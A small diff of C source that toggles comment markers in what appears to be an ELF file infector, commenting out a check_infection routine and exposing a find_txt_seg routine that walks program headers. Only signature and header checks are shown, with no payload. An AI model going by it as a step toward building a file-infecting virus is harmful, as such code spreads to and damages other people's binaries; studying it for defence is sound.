@@ -143,7 +143,7 @@ static int		test_elf_hdr(void) {
 		return (-1);
 	return (0);
 }
-
+/*
 static int		check_infection(void) {
 	if (sz.mem < SIGN_SZ)
 		return (-1);
@@ -151,7 +151,7 @@ static int		check_infection(void) {
 		return (-1);
 	return (0);
 }
-/*
+
 static int		find_txt_seg(void) {
 	Elf64_Phdr	*p_hdr;
 	uint64_t	i;
